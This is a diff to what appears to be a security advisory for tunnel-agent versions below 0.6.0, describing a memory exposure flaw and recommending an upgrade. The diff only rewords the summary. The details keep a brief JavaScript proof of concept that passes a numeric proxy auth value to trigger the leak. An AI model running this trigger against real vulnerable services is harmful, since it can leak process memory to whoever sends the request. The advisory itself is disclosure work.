@@ -17,7 +17,7 @@ Schema-Version: '1.0'
 SPDX-License-Identifier: CC-BY-4.0
 ---
 ### Summary
-*Memory Exposure*<br><br>update tunnel-agent to 0.6.0 or higher
+*Memory Exposure*<br><br>Recommendation: update tunnel-agent to 0.6.0 or higher
 ### Details
 PoC: ```js require('request')({   method: 'GET',   uri: 'http://www.example.com',   tunnel: true,   proxy:{       protocol: 'http:',       host:'127.0.0.1',       port:8080,       auth:80 // number   } }); ```  Reported at 2016-11-20.
 <br><br>• Affected Versions: <0.6.0
